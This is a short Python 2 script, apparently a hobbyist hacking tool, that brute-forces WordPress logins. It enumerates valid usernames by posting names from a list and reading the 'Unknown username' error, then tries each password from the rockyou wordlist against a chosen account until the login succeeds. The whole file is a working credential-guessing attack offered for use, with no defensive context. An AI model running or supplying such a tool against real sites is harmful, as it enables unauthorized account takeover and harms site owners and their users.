#usr/bin/python2

#testing for python 2.7.18

#update tools can brute force username or password

import sys
import requests
import os

# clean screen
os.system("cls")
os.system("clear")

logo = '''

###################################
#
####### Wordpress brute force ##### 
          twitter: y0usef_11
###################################
            
'''

print (logo)

#function check for username

def check_username():
    url = raw_input("input url : ")
    users = raw_input("Enter users list : ") # list users text file
    files = open(users,'r')
    for line in files:
        remove = line.rstrip("\n")
        data = {'log':remove,'pwd':'test'}
        re = requests.post(url,data=data)

        txt = re.content

        if "Unknown username" in txt:
            print(" [-] Username incorrect : " + remove)
        else:
            print(" [+] Username correct : " +  remove)
            break
            

#function check for password

def check_password():
     url = raw_input("Enter url : ")
     username = raw_input("Enter username : ") # username 
     print(" [+] Getting list Password rockyou")
     files = open('/usr/share/wordlists/rockyou.txt','r')
     for line in files:
         remove = line.rstrip("\n")
         data = {'log':username,'pwd':remove}
         re = requests.post(url,data=data)

         txt = re.content

         if "incorrect" in txt:
             print(" [-] password incorrect : " + remove)
         else:
             print(" [+] password correct : " +  remove)
             break

number = input(" [+] What is Bute Force username enter 1 or password enter 2 : ")

if number == 1:
    check_username()
elif number == 2:
    check_password()
